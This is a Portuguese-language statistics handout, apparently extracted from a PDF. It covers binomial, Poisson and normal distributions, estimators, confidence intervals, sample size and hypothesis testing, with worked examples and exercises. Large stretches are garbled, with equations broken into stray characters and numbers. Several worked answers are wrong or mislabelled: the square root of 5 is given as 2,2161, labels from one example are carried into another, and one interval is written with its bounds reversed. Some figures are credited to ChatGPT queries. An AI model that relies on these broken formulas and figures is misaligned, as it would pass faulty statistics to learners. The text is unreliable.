=
-
P
269286
,0
226981
,0.
059319
,0.
20
61
,0.
39
,0
]}.
!3
)!.
3
6
/[(
!6
{
)3
(
3
6
3
@
@
-
=
-
P
129125
,0
3721
,0.
023134
,0.
15
61
,0.
39
,0
]}.
!4
)!.
4
6
/[(
!6
{
)
4
(
4
6
4
@
@
-
=
-
P
033022
,0
61
,0.
009022
,0.6
61
,0.
39
,0
]}.
!5
)!.
5
6
/[(
!6
{
)5
(
5
6
5
@
@
-
=
-
P
003519
,0
1.
003519
,0.1
61
,0.
39
,0
]}.
!6
)!.
6
6
/[(
!6
{
)
6
(
6
6
6
@
@
-
=
-
P
Distribuição 
x 
P(x) 
0 
0,558406 
1 
0,345082 
2 
0,085301 
3 
0,010543 
4 
0,000652 
5 
0,000016 
S 
1,000000 
 
Distribuição 
x 
P(x) 
0 
0,051520 
1 
0,197636 
2 
0,315893 
3 
0,269286 
4 
0,129125 
5 
0,033022 
6 
0,003519 
S 
1,000001 
 
 
 
0
3
0
1
2
4
5
6
1
3
4
5
2
0
2
3
31,59%
x versus P
P
x
4
5
6
1
Cotas (B=6; H=4,8) 
x 
P(x) 
Cotas 
0 
0,051520 
0,78 
1 
0,197636 
3,00 
2 
0,315893 
4,80 
3 
0,269286 
4,09 
4 
0,129125 
1,96 
5 
0,033022 
0,50 
6 
0,003519 
0,05 
S 
1,000001 
 
 

 
 
 
 
 
b) P(4) @ 0,129125 @ 12,91% 
c) P(>=3) = P(3)+P(4)+P(5)+P(6) @ 0,269286+0,129125+0,033022+0,003519 = 
0,434952 @ 43,50%  
d) P(<=2) = P(0)+P(1)+P(2) @ 0,051520+0,197636+0,315893 = 0,565049 @ 56,50% 
e) P(<3) = P(0)+P(1)+P(2) @ 56,50% 
f) Valor Esperado E(x) = n.p = 6.0,39 = 2,34 casas infectadas 
g) Variância = n.p.q = 6.0,39.0,61 =  1,4274 casas infectadas2 
h) Desvio-Padrão = Raiz(Variância) = 1,4274^0,5  @ 1,1947 casas infectadas 
 
 
 
3.4- DISTRIBUIÇÃO DE POISSON 
 
É uma distribuição discreta de probabilidades, correspondente a Binomial quando temos 
eventos raros em que uma variável aleatória satisfaz aos seguintes requerimentos: 
 a) o experimento consiste numa quantidade de repetições x que um evento ocorre num 
domínio (tempo, área, volume, superfície, lote etc); 
 b) a probabilidade da ocorrência do evento para cada domínio é constante;  
c) as ocorrências num intervalo independem das ocorrências noutro intervalo. 
 
FÓRMULA DA PROBABILIDADE DE POISSON: 𝑏(𝑘; 𝑛; 𝑝) =
4"#$("0)%
5!
 𝑜𝑢 𝑝(𝑘) =
4"&(7)%
5!
.  Sendo:  𝜇 ® média de ocorrências num intervalo unitário (= µ); e ® @ 
2,718281828... @ 2,71828;  𝑘 ® número de ocorrências; P(k) ® probabilidade da 
quantidade k de ocorrências. 
 
MÉDIA E VARIÂNCIA DA DISTRIBUIÇÃO DE POISSON: 
Valor Esperado (Média): 
;    Variância: 
 
 
l
µ =
=
)
(x
E
l
s
=
2

 
 
Ex.1: Uma loja de autopeças vende uma média de 12 retrovisores por mês e mantém 
um estoque de 18 retrovisores. Determine as probabilidades: a) de venda de 8 
retrovisores; b) de venda de até 2 retrovisores; c) de venda de 10 retrovisores; e, c) do 
estoque ser zerado. (Distribuição de Poisson:   ® 12 retrovisores; e @ 2,71828; 𝑝(𝑘) =
4"&(7)%
5!
) 
a) x=8 ® 
 
b) x=1 e 2 ®
 
  
 
b) x=10 ®
 
b) x=18 ®
 
 
Ex.2: Em lotes com 500 produtos estima-se que 1% seja defeituoso. A partir disso e 
admitindo-se uma distribuição de Poisson para produtos defeituosos, determine:  
a) a distribuição de probabilidades para a variável produtos defeituosos entre 0 e 11  
b) a probabilidade de se verificarem exatamente 3 produtos defeituosos;  
c) a probabilidade de pelo menos 4 produtos defeituosos;  
d) a quantidade de produtos defeituosos que corresponde a uma probabilidade de até 
8,4%; 
e) o Valor Esperado de produtos defeituosos;  
f) a Variância de produtos defeituosos;  
g) o Desvio-Padrão dos produtos defeituosos; e,  
h) o Coeficiente de Variação dos produtos defeituosos. (Distribuição de Poisson: 𝜇 ® 
0,01*500=5 produtos defeituosos; e @ 2,71828; 
). 
 
a) Distribuição e gráfico 
0655
,0
...
065523
,0
!8
/
12
)8
(
12
8
@
=
=
-
e
P
)
2
(<
P
(
) (
)
0005
,0
...
000442
,0
..
000073
,0
!2
/
12
!1
/
12
)
2
(
)1(
)
2
(
12
2
12
1
@
+
=
+
=
+
=
<
-
-
e
e
P
P
P
(
)
1048
,0
...
10483
,0
!
10
/
12
)
10
(
12
10
@
=
=
-
e
P
(
)
0255
,0
...
02554
,0
!
18
/
12
)
18
(
12
18
@
=
=
-
e
P
!
/
)
(
x
e
x
P
x
l
l
-
=

 
 
x=00 ® 
 
x=01 ® 
 
x=02 ® 
 
x=03 ® 
 
x=04 ® 
 
x=05 ® 
 
x=06 ® 
 
x=07 ® 
 
x=08 ® 
 
x=09 ® 
 
x=10 ® 
 
x=11 ® 
 
 
b) x=03 ® 
 
c) P(>=4) = P(4)+P(5)+....+P(11) @ 0,729521 
d) P(x) = 8,4% ®  x=2 ® 
 
e) E(x) = µ = l = 5 produtos defeituosos 
f)  2 = l = 5 produtos defeituosos2 
g)   = Raiz( 2) = Raiz(5) @ 2,2161 produtos defeituosos 
h) CV =   µ = 2,2161/5 @ 0,4432 = 44,32%  
 
 
3.4- DISTRIBUIÇÕES CONTÍNUAS 
 
Uma função definida num espaço amostral Ω que assume valores num intervalo, é dita 
Variável Aleatória Contínua. 
As distribuições contínuas de probabilidade mais comuns são as seguintes: Uniforme, 
Exponencial, Gama, Weibull, Normal, LogNormal, Beta e Triangular.  
006738
,0
!
00
/
5
)
00
(
5
00
@
=
-
e
P
033690
,0
!
01
/
5
)
01
(
5
01
@
=
-
e
P
084224
,0
!
02
/
5
)
02
(
5
02
@
=
-
e
P
140374
,0
!
03
/
5
)
03
(
5
03
@
=
-
e
P
175467
,0
!
04
/
5
)
04
(
5
04
@
=
-
e
P
175467
,0
!
05
/
5
)
05
(
5
05
@
=
-
e
P
146223
,0
!
06
/
5
)
06
(
5
06
@
=
-
e
P
104445
,0
!
07
/
5
)
07
(
5
07
@
=
-
e
P
065278
,0
!
08
/
5
)
08
(
5
08
@
=
-
e
P
036266
,0
!
09
/
5
)
09
(
5
09
@
=
-
e
P
018133
,0
!
10
/
5
)
10
(
5
10
@
=
-
e
P
008242
,0
!
11
/
5
)
11
(
5
11
@
=
-
e
P
140374
,0
!
03
/
5
)
03
(
5
03
@
=
-
e
P
084224
,0
!
02
/
5
)
02
(
5
02
@
=
-
e
P
 
 
 
 
Cotas  
(B=11; H=8,8) 
x 
P(x) 
Cotas 
0 
0,006738 
0,34 
1 
0,033690 
1,69 
2 
0,084224 
4,22 
3 
0,140374 
7,04 
4 
0,175467 
8,80 
5 
0,175467 
8,80 
6 
0,146223 
7,33 
7 
0,104445 
5,24 
8 
0,065278 
3,27 
9 
0,036266 
1,82 
10 
0,018133 
0,91 
11 
0,008242 
0,41 
 

 
 
Para V.A contínuas, a probabilidade de um valor único ocorrer é zero, então calculamos 
probabilidade de valores em subintervalos.  
 
Ex: Qual a probabilidade de o relógio parar entre 0:00 e 4:00? 
• 
𝑝=
8
'8 = 16,67% 
 
Ex: A faixa salarial em uma empresa é de R$1.800,00 a R$20.000,00. Qual a 
probabilidade de um funcionário ganhar um salário entre R$4.000,00 a R$10.000,00? 
• 
𝑝=
*.999
&:.'99 = 32,97% 
 
Dentre estas destacamos a Distribuição Normal, que pode ser amplamente empregada 
em diversas áreas e será a única estuda nesse curso. 
 
 
3.4.1 - A DISTRIBUIÇÃO NORMAL 
 
As propriedades da distribuição normal são:  
a) a média aritmética, mediana e moda são iguais; 
b) é representada por uma curva que tem formato de sino sendo simétrica em torno da 
média, denominada de Curva Normal, como mostra a figura a seguir; 
c) 
a 
curva 
caracteríestica 
(Curva 
Normal) 
é 
definida 
pela 
equação: 
, sendo completamente especificada pela média 
𝜇 e pelo desvio-padrão 𝜎;  
d) A área sob a curva Normal é igual à unidade.  
A curva Normal se aproxima do eixo das abscissas sem nunca toca-lo (é assintótica em 
relação ao eixo das abscissas);  
e) A curva normal possui pontos de inflexão (mudança de concavidade) nas abscissas  
 
p
s
s
µ
2
)
(
2
2
2
/
)
( -
-
=
=
=
=
x
e
y
x
f
fdp
Densidade

 
 
 
 
 
 
Uma observação importante sobre o comportamento da curva Normal, é que quanto 
maior o desvio-padrão da distribuição, mais alargada será a curva em relação ao eixo 
definido pela média. Assim: 
 
 
 
 
Média=2,3  e  Desvio-
Padrão=0,7 
Média=4,6  e  Desvio-
Padrão=0,7 
Média=4,6  e  Desvio-
Padrão=2,4 
 
 
3.4.2 – CURVA NORMAL E PROBABILIDADES 
 
Sendo a área total sob a curva Normal igual à unidade, a 
área de uma região sob a curva Normal será a 
probabilidade da variável aleatória se situar no intervalo 
correspondente. Assim, a probabilidade de um valor x 
µ-s
µ
µ-2s
µ-3s
µ+s
µ+2s
µ+3s
x
A
f(x)
µ-4s
µ+4s
 
 
µ
x
fdp
a
b
A

 
 
estar entre as abscissas “a” e “b” da curva Normal, será numericamente igual à 
respectiva área delimitada pela curva Normal e os seguimentos verticais que passam 
por esses valores. Assim: 
. Não existe probabilidade, em variáveis 
aleatórias contínuas, para valores específicos, apenas para intervalos. 
 
Uma observação importante sobre as probabilidades e a curva Normal é que, como 
mostrado na figura a seguir: 
 
Assim, conhecendo-se as áreas correspondentes a todos os intervalos de abscissas, é 
possível a determinação de todas as probabilidades a partir da curva Normal. 
 
 
 
6.3 – CURVA NORMAL PADRONIZADA 
 
A curva Normal padronizada é aquela obtida considerando-se a média igual a zero e o 
desvio-padrão igual a 1. A correlação entre a curva normal de um dado problema e a 
curva Normal padronizada é obtida calculando-se um escore (z). O escore é uma 
medida de posição dada nas unidades de desvio padrão (quantidade de desvios-padrão 
em relação à média), sendo: 
.  
A
b
x
a
P
=
£
£
)
(
s
µ
-
=
-
-
=
x
padrao
desvio
media
valor
z
 

 
 
Após transformar o valor podemos determinar probabilidade 𝑝(𝑧≤𝑎),  𝑝(𝑎≤𝑧≤
𝑏) 𝑜𝑢 𝑝(𝑧≥𝑎) 
 
Na curva Normal padronizada, quando z=0 a área englobada corresponde a 0,5, sendo 
que a área total sob a curva, como na curva Normal, continua igual à unidade.  
 
 
ÁREAS ACUMULADAS NA CURVA NORMAL PADRÃO (-5,00 < z < 5,00)  
 
A partir das tabelas acima, é possível obter uma área acumulada até um 
valor de determinado escore z.  
As tabelas abaixo nos dão a probabilidade de que o escore seja menor 
ou igual a determinado valor, ou apenas menor, já que a probabilidade da igualdade é 
nula para varáveis contínuas. 
 
 
 
 
 
   
 
 
 
 
 
 
 
z
A

 
 
 
OBTENDO ESCORES A PARTIR DA ESPECIFICAÇÕES DE ÁREAS 
 
A transformação de um escore em um valor de variável aleatória é feito através de: 
 
Logo: 
 
Assim: 𝑥= 𝜇+ 𝜎𝑧 
 
 
Ex.1: A produção média numa lavoura é de 550 sacas por região, com um desvio-padrão 
de 12 sacas por região. Qual a probabilidade de numa localidade interna, escolhida ao 
acaso, a produção se situar entre 538 e 574 sacas? 
 
Na tabela de distribuição normal temos a probabilidade 𝑝(𝑥≤𝑧), neste caso temos que 
normalizar os escores e despois subtrair as probabilidades para então determinar 𝑝(𝑎≤
𝑥≤𝑏) 
Vamos normalizar 574 e verifica na tabela a probabilidade 
𝑧& = 574 −550
12
= 2  𝑒 𝑝(𝑧≤2) = 0,9772 
Vamos normalizar 538 e verifica na tabela a probabilidade 
𝑧' = 538 −550
12
= −1  𝑒 𝑝(𝑧≤−1) = 0,1587 
 
 
Nesse caso 
Logo: P(538 < x < 574) @ 0,9772-0,1587 = 0,8185 @ 81,85% 
 
Ex.2: As contas telefônicas de uma residência, em reais, foram as seguintes: {88,40; 
92,58 ; 117,21;  102,78;  89,63;  101,01;  112,89;  107,65;  92,78;  99,96;  91,81}. A partir 
desses informes, qual a probabilidade de uma conta ficar entre 115 e 120 reais? 
  
s
µ
-
=
-
-
=
x
padrao
desvio
media
valor
z
x
z
x
z
x
z
=
+
®
-
=
®
-
=
µ
s
µ
s
s
µ
.
.

 
 
Primeiro vamos calcular a média e o desvio padrão 
R.: 
 
 
 
 
 
 
 
Vamos normalizar 574 e verifica na tabela a probabilidade 
𝑧& = 120 −99,7
9,72
= 2,0884  𝑒 𝑝(𝑧≤2,0884) = 0,9817 
Vamos normalizar 538 e verifica na tabela a probabilidade 
𝑧' = 115 −99,7
9,72
= 1,57  𝑒 𝑝(𝑧≤−1) = 0,9406 
 
 
Nesse caso 
Logo: P(538 < x < 574) @0,9817 −0,9406 = 0,0411 = 4,115% 
A probabilidade de que os valores estejam entre 115 e 120 é de 4,115% 
 
70
,
99
11
/
7,
1096
11
/)
81
,
91
96
,
99
78
,
92
65
,
107
89
,
112
01
,
101
63
,
89
78
,
102
21
,
117
58
,
92
40
,
88
(
/
=
=
=
+
+
+
+
+
+
+
+
+
+
=
å
=
n
x
x
[
]
49766
,
94
10
/
9766
,
944
)
)
7,
99
81
,
91
(
)
7,
99
96
,
99
(
)
7,
99
78
,
92
(
)
7,
99
65
,
107
(
)
7,
99
89
,
112
(
)
7,
99
01
,
101
(
)
7,
99
63
,
89
(
)
7,
99
78
,
102
(
)
7,
99
21
,
117
(
)
7,
99
58
,
92
(
)
7,
99
40
,
88
(
1
11
1
)
(
1
1
2
2
2
2
2
2
2
2
2
2
2
2
2
=
=
-
+
-
+
-
+
-
+
-
+
-
+
-
+
-
+
-
+
-
+
-
-
=
å
-
-
=
x
x
n
s
721
,9
...
720990
,9
49766
,
94
2
@
=
=
=
s
s

 
 
 
Ex.: Para uma média de 68 unidades e um desvio padrão de 9 unidades, determine o 
valor da variável aleatória (x) que corresponderá a uma probabilidade de 96%.  
R.: 
 
Pela tabela o escore que corresponde a uma probabilidade de 96% é 𝑧= 1,76. Para 
encontrar o valor correspondente devemos usar  
 
𝑥= 𝜇+ 𝜎𝑧        𝑥= 68 + 9.1,76 = 83,84 
Seguem alguns exemplos de aplicação da curva normal padronizada no cálculo de 
problemas. 
 
Ex.: Uma pesquisa sobre peso de sacas de soja revela que um lote inspecionado possui 
um peso médio de 51,1 kg com um desvio padrão de 3,8 kg, segundo uma distribuição 
normal. Escolhendo-se uma saca ao acaso, determine as probabilidades (com o auxílio 
da curva Normal Padrão) dessa amostra:  
a) ter um peso inferior a 42 kg; 
b) ter um peso entre 47,5 e 49,5 kg;  
c)  possuir peso entre 50,2 e 54,7 kg; 
 d) pesar entre 55,1 e 57,8;  
e) possuir peso superior a 62 kg.  
f) Para qual peso temos uma probabilidade de 8,4% de os valores serem menores que 
esse peso? 
R.: 
Dados: 𝜇=51,1kg e 𝜎=3,8kg. 
 
a) P(x<42): 
 𝑧=
!;7
< = (42-51,1)/3,8 = -2,394736... @ -2,39 ÞTCNPÞ P(z<-2,39) = 0,013553 
\P(x<42) @ 1,36% 
 
b) P(47,5<x<49,5): 
z1 = 
!';7
< = (47,5-51,1)/3,8 = -0,947368... @ -0,95 ÞTCNPÞ P(z<-0,95) = 0,197663 

 
 
z2 = 
!(;7
< = (49,5-51,1)/3,8 = -0,421052... @ -0,42 ÞTCNPÞ P(z<-0,42) = 0,351973 
\ P(47,5<x<49,5) = P(-0,95<z<-0,42) = P(z<-0,42)-P(z<-0,95) = 0,351973-0,197663 = 
0,154310 @ 15,43% 
 
c) P(50,2<x<54,7): 
z1 = 
!';7
<  = (50,2-51,1)/3,8 = -0,236842... @ -0,24 ÞTCNPÞ P(z<-0,24) = 0,466441 
z2 = 
!(;7
<  = (54,7-51,1)/3,8 = 0,947368... @ 0,95 ÞTCNPÞ P(z<0,95) = 0,828944 
\ P(50,2<x<54,7) = P(-0,24<z<0,95) = P(z<0,95)-P(z<-0,24) = 0,828944-0,466441 = 
0,362503 @ 36,25% 
 
d) P(55,1<x<57,8): 
z1 = 
!';7
< = (55,1-51,1)/3,8 = 1,052631... @ 1,05 ÞTCNPÞ P(z<1,05) = 0,853141 
z2 = 
!(;7
< = (57,8-51,1)/3,8 = 1,763157... @ 1,76 ÞTCNPÞ P(z<1,76) = 0,960796 
\ P(55,1<x<57,8) = P(1,05<z<1,76) = P(z<1,76)-P(z<1,05) = 0,960796-0,853141 = 
0,107655 @ 10,77% 
 
e) P(x>62,0) = 1-P(x<62,0): 
z = 
!;7
< = (62,0-51,1)/3,8 = 2,868421... @ 2,87 ÞTCNPÞ P(z<2,87) = 0,997948 
\ P(x>62,0) = 1-P(x<62,0) = 1-P(z<2,87) = 1-0,997948 = 0,002052 @ 0,21% 
 
f) x p/ P=8,4%=0,084: 
Pela tabela vemos que o escore mais próximo do percentual dado é 𝑧= −1,42, 
utilizando a fórmula obtemos o valor pedido 
 
 𝑥= 𝜇+ 𝜎𝑧 = 51,1-1,42*3,8 = 45,704 @ 45,70 kg 
 
 
 
 
 

 
 
EXERCÍCIOS 
 
1) Dado o quadro abaixo, marque o tipo de variável aleatória (D-Discreta e C-Contínua). 
Descrição 
Tipo 
Quantidade de atendimentos de um balconista num dia normal 
 
Duração das chamadas recebidas pelo atendente de uma repartição 
 
Peso de sacos de 10kg numa inspeção de qualidade 
 
Quantidade de produtos defeituosos num lote destinado à expedição 
 
Número de estudantes que freqüentaram as aulas em 06/08/07 numa IES  
Número dos pacientes atendidos por dia num posto de saúde 
 
Quantidade de palavras nos letreiros dos outdoors de uma cidade 
 
 
2) Verifique se as distribuições dadas a seguir podem ser distribuições de probabilidade. 
Suposta distribuição 
S / N 
D1 = {0,11  0,13  0,08  0,06  0,24  0,32   0,06}  
 
D2 = { 0,22  0,33  0,44  0,55   0,66} 
 
D3 = {0,2  0,2  0,2  0,2  0,1  0,1} 
 
D4 = {0,1  0,1  0,1  0,1  0,1  1,0  0,1  0,1  0,1  0,1} 
 
D5 = {0,05  0,03  0,40  0,02  0,03  0,07  0,12  0,08 0,05  0,15} 
 
D6 = {0,08  0,38  0,04  0,07  0,11  0,09  0,2} 
 
 
 
3) Faça a distribuição de probabilidade empírica para a tabela abaixo: 
 
 
 
 
 
 
 
 
 
x 
f 
P (=fr) 
05 
13 
 
10 
7 
 
15 
30 
 
20 
21 
 
 
 
 
             
 
 
 

 
 
4) Uma moeda é lançada 5 vezes. Sabendo que a probabilidade de sair cara em cada 
lançamento é de 0,6, responda às perguntas abaixo 
a) Qual a probabilidade de sair exatamente 3 caras?       R: 0,3456 ou 34,56% 
b) Qual a probabilidade de sair pelo menos 4 caras?       R: 0,337 ou 33,7% 
c) Qual o número médio (valor esperado) de caras em 5 lançamentos? (Lembre-se 
que para a distribuição binomial 𝐸(𝑥) = 𝑛𝑝)                  R= 3 caras 
 
5) Uma professora e está avaliando as notas de uma turma em um exame. A média das 
notas foi 70, com um desvio padrão de 10 pontos. Se as notas seguem uma distribuição 
normal 
a) Qual a probabilidade de que um aluno tire uma nota menor 85? 
b) Qual a probabilidade de que um aluno tire nota maior que 85? 
c) Qual a faixa de notas em que estão 95% dos alunos? 
 
6) Uma professora quer estimar quantos alunos fazem perguntas durante uma aula. 
Após acompanhar várias aulas, ela percebeu que, em média, 3 alunos fazem perguntas 
em cada aula. Suponha que a quantidade de perguntas segue uma distribuição de 
Poisson. 
a) Qual é a probabilidade de exatamente 4 alunos fazerem perguntas em uma aula?   
R=16,81% 
b) Qual é a probabilidade de nenhum aluno fazer perguntas em uma aula? 
R=4,98% 
 
 
 
 
 
 
 
 
 
 

 
 
UNIDADE 4: ESTIMADORES 
 
Aqui trataremos significância de estimadores e seus intervalos de confiança, tamanho 
de amostra. Isso é necessário para que o resultado da pesquisa seja validado para a 
população num todo.  
 
4.1 Estimativas 
 
Em uma consulta ao ChatGPT sobre as estimativas sobre o uso de redes sociais 
obtivemos os seguintes dados:  
- 60% da população global utiliza redes socias 
- O número de usuários tem uma taxa de crescimento de 3% ao ano 
- Em média as pessoas passam 2 horas e 30  minutos por dia nas redes sociais 
  
A todo momento nos deparamos com dados obtidos em uma amostra que representam 
a população no todo. Os resultados obtidos sobre uma amostra da população são 
Estimativas. 
Em várias ocasiões usamos ou ouvimos falar sobre estimativas dos mais diversos tipos 
de assuntos e são utilizadas para auxiliar nossas decisões, projetos, planejamentos. 
As estimativas aproximam os valores correspondentes a toda população. Quando se 
trata de dados sobre a população, dizemos que é um parâmetro. A grande questão é 
saber o quanto essa estimativa é confiável e se realmente representa a população. 
Estimadores estatísticos são funções matemáticas utilizadas para estimar parâmetros 
desconhecidos de uma população com base em amostras observadas. Aqui estão 
alguns pontos importantes sobre estimadores estatísticos: 
 
Definição básica: Um estimador estatístico é uma função aplicada aos dados amostrais 
que produz uma estimativa ou uma aproximação do valor de um parâmetro populacional 
desconhecido. 
 
Parâmetros e estimadores: Os parâmetros são características numéricas das 
populações que queremos estudar, como a média, a variância, a proporção, entre 

 
 
outros. Os estimadores são funções dos dados amostrais que procuram estimar esses 
parâmetros. 
 
Tipos de estimadores: 
Estimadores pontuais: Produzem uma única estimativa para o parâmetro 
desconhecido. Exemplos incluem a média amostral como estimativa da média 
populacional. 
      Estimadores intervalares: Produzem um intervalo de valores dentro do qual o 
parâmetro                  populacional é provável que se encontre, com uma certa 
probabilidade de confiança. 
 
Propriedades desejáveis: 
- Não-viesados: O estimador não apresenta tendência sistemática para superestimar 
ou subestimar o parâmetro. 
       . Eficiência: O estimador tem uma variância pequena, o que significa que é mais 
provável        que esteja próximo do valor real do parâmetro. 
      - Consistência: À medida que o tamanho da amostra aumenta, o estimador 
converge para o valor verdadeiro do parâmetro. 
 
Exemplos comuns: 
Média amostral: Estimador da média populacional. 
Proporção amostral: Estimador da proporção populacional. 
Variância amostral: Estimador da variância populacional. 
Uso prático: Estimadores são fundamentais na análise estatística e na inferência, 
ajudando a tirar conclusões sobre uma população com base em uma amostra 
representativa dela. 
Em resumo, os estimadores estatísticos são ferramentas poderosas para extrair 
informações sobre populações a partir de dados amostrais, permitindo que os 
pesquisadores e analistas compreendam melhor os fenômenos que estão estudando. 
 
4.2 INTERVALO DE CONFIANÇA 

 
 
Iniciaremos agora uma introdução à Inferência Estatística, que consiste em análises 
para determinar dados sobre uma população através de amostras. 
As estimativas possuem um Intervalo de Confiança onde usados um valor chamado 
de Margem de Erro ou Erro padrão para mais e para menos, com o intuito de que o 
parâmetro pertença a esse intervalo. O Intervalo de Confiança pode ser abreviado para 
I.C. 
Já o nível de confiança é a probabilidade de que o I.C realmente contenha o parâmetro. 
Podemos usar níveis de segurança de 95%, 90% e assim por diante. Através do nível 
de confiança adotado que calculamos a margem de erro.  
4.2.1 Intervalo de confiança para Proporção Populacional 
Vamos introduzir o cálculo do intervalo de confiança através de um exemplo. 
 
Ex (IC para proporção populacional): Estima-se que 60% da população entre 18 e 65 
anos utiliza redes sociais. Vamos considerar um nível de confiança de 95%, o que nos 
dá intervalo de confiança de 56,96% a 63,04%. Como esse intervalo de confiança é 
calculado?  
Consideramos nesse caso a distribuição normal para determinar o escore 
correspondente ao nível de confiança desejado que chamaremos de 𝑧. A Margem de 
Erro é calculada pela fórmula: 
𝑀𝐸= 𝑧= '
> . T𝑝(1 −𝑝)
𝑛
 
O Intervalo de Confiança (IC) é dado por 
𝐼𝐶= 𝑝± 𝑀𝐸 
𝑝 é a estimativa 
𝑛 é o tamanho da amostra 
𝑧= '
>  é o escore correspondente ao nível de confiança.  
 
No exemplo anterior consideramos o nível de confiança de 95%, que gera um escore 
1,96 

 
 
 
 
Considerando que a amostra é composta por 1.000 pessoas, determinamos a margem 
de erro por: 
𝑀𝐸= 1,96. T0,6(1 −0,6)
1000
= 0,0304 
Com essa 𝑀𝐸, o intervalo de confiança será  
𝐼𝐶) = 0,6 + 0,0304 = 0,6304 = 63,04% 
𝐼𝐶; = 0,6 −0,0304 = 0,5696 = 56,96% 
 
A tabela abaixo mostra os escores para alguns níveis de segurança: 
Nível de Confiança 
Escore 
90% 
1,645 
95% 
1,96 
99% 
2,575 
 
O nível de confiança deve ser sempre informado junto aos resultados dos estimadores. 
 
4.2.2 Tamanho da amostra para proporção populacional 
 

 
 
Temos uma fórmula básica para determinar o tamanho da amostra quando não é 
conhecido o tamanho da população, utilizando a fórmula para a margem de erro. Para 
isso precisamos ter o nível de confiança, determinar qual será a margem de erro e 
considerar a estimativa de 0,5 (50%), daí teremos para o caso de proporção 
populacional:  
𝑀𝐸= 𝑧= '
> . T𝑝(1 −𝑝)
𝑛
 
𝑛=
(?) (
* )(0(&;0)
@.(
     ou 𝑛=
(?) (
* )(.9,'(
@.(
 
 
Quando o tamanho da população, 𝑁, é conhecido usamos outra fórmula: 
𝑛=
𝑁. 𝑧= '
>
'𝑝(1 −𝑝)
𝑀𝐸'(𝑁−1) + 𝑧= '
>
'𝑝(1 −𝑝) 
Ex: Determine o tamanho da amostra com um intervalo de confiança de 95%, estimador 
de 0,5 e margem de erro de 5%. 
𝑛= 1,96'. 0,25
0,05'
= 384 
 
Ex: Determine o tamanho da amostra com um intervalo de confiança de 95%, estimador 
de 0,5 e margem de erro de 5% em uma população com 1.000.000 de indivíduos. 
𝑛=
𝑁. 𝑧= '
>
'𝑝(1 −𝑝)
𝑀𝐸'(𝑁−1) + 𝑧= '
>
'𝑝(1 −𝑝) 
𝑛=
1.000.000 × 1,96' × 0,25
0,05' × 999.999 + 1,96' × 0,25 = 384 
Como nossa população é grande obtivemos os mesmos valores para as duas fórmulas.  
 
OBS: os valores determinados para o tamanho da amostra são no caso mínimos. 
Quanto maior amostra melhor será o estimador 
 
4.2.3 Intervalo de confiança para Média populacional. 
 
Também introduziremos esse conceito através de um exemplo 

 
 
Ex: (Intervalo de confiança para média populacional com desvio padrão conhecido) 
Vamos considerar que foram medidas as notas finais de 30 alunos, com média 𝜇= 75 
e desvio padrão 𝜎= 10. Considerando um nível de confiança de 95%, já temos 𝑧= 1,96. 
Neste caso vamos determinar IC para média populacional, cuja margem de erro é dada 
por: 
 
𝑀𝐸= 𝑧= '
> . 𝜎
√𝑛= 1,96. 10
√30
= 3,578 
O intervalo de confiança é dado por: 
𝐼𝐶) = 75 + 3,578 = 78,578 
𝐼𝐶; = 75 −3,578 = 71,422 = 
O intervalo de confiança é (78,578;  71,422). 
 
 
4.2.4 Tamanho da amostra para média populacional 
Para calcular o tamanho da amostra no caso da média populacional utilizamos a 
fórmula: 
𝑛= Z
𝑧= '
> . 𝜎
𝑀𝐸[
'
 
 
Ex: Determine o tamanho da amostra para um nível de confiança de 95%, com desvio 
padrão de 3 unidades e margem de erro de 1,45. 
 
𝑛= Z
𝑧= '
> . 𝜎
𝑀𝐸[
'
= Z1,96.3
1,45 [
'
= 17 
Uma amostra de 17 elementos dessa população já é suficiente.  
 
Ex: Suponha que você deseja estimar a média de uma população com um intervalo de 
confiança de 95% e uma margem de erro máxima aceitável de 5 unidades. O desvio 
padrão populacional é estimado em 20. Qual é o tamanho mínimo da amostra? 
Passos para calcular o tamanho da amostra: 
1. Determine os parâmetros: 
o Margem de erro (ME) = 5 

 
 
o Desvio padrão populacional (𝜎) = 20 
o Nível de confiança = 95% (o que implica uma área de 0,025 em cada extremidade da 
distribuição normal) 
2. Encontre o valor crítico 𝑧= '
> : 
o Para um intervalo de confiança de 95%, o valor crítico 𝑧= '
>  é aproximadamente 1,96 
(isso corresponde a 97,5% da área acumulada da distribuição normal padrão). 
3. Use a fórmula para o tamanho da amostra (n): 
𝑛= Z
𝑧= '
> . 𝜎
𝑀𝐸[
'
= Z1,96.20
5
[
'
= 61,47 = 62 
Para estimar a média populacional nesse caso uma amostra de 62 elementos é 
suficiente. 
 
 
Segundo Mario Triola, os pré-requisitos básicos para um determinar um “bom” estimador 
são: 
- A amostra deve ser uma amostra aleatória simples, não uma amostra inadequada (tal 
como uma amostra de resposta voluntária). 
- O nível de confiança deve ser fornecido. (Ele é, em geral, de 95%, mas os relatórios 
da mídia sempre se esquecem de identificá-lo.) 
- O tamanho amostral deve ser fornecido. (Em geral, ele é informado pela mídia, mas 
nem sempre.) 
Exceto por casos relativamente raros, a qualidade dos resultados da pesquisa depende 
do método de amostragem e do tamanho da amostra, mas o tamanho da população 
usualmente não é um fator. 
 
4.3 TESTE DE HIPÓTESE 
 
Observe o resultado da pesquisa realizada no ChatGPT sobre a utilização do teste de 
hipóteses para identificar fraudes: 
“O teste de hipóteses pode ser uma ferramenta útil para identificar padrões incomuns 
ou anômalos que podem sugerir fraudes.”  

 
 
O teste de hipóteses é utilizado inclusive em situações judiciais, claro que com outras 
ferramentas auxiliares para compor provas favoráveis ou não.  
Mas o que é afinal o teste ou “os testes” de hipótese? 
 
Definição: Em estatística, uma hipótese é uma afirmativa sobre alguma propriedade de 
determinada população. Um teste de hipótese (ou teste de significância) é um 
procedimento para o teste de uma afirmativa sobre uma propriedade de uma população.  
A propriedade a que a definição se refere pode ser uma média, proporção, desvio 
padrão, etc.  
Os componentes de um teste de hipótese são: 
• Hipótese Nula (𝑯𝟎) é a afirmativa sobre o parâmetro populacional, um valor dado para 
a média, proporção, desvio padrão, etc.  
• Hipótese Alternativa (𝑯𝟏) é a afirmativa de que o parâmetro de alguma forma difere do 
parâmetro populacional. Nesse caso podemos considerar as que 𝐻& < 𝐻9; 𝐻& >
𝐻9 ; 𝐻& ≠𝐻9 para este caso dizemos que o teste é bilateral. 
Para decidir se aceitaremos ou rejeitaremos a hipótese nula, precisamos calcular a 
Estatística de Teste que é um valor utilizado para rejeitar ou aceitar a hipótese nula. É 
necessário pressupor que a distribuição da variável aleatória considerada é normal. O 
nível de significância dos testes normalmente é 𝛼= 0,05 , que compreende a escores 
𝑧< −1,645 ou 𝑧> 1,645, ou seja a hipótese nula é rejeitada para esses escores. 
 
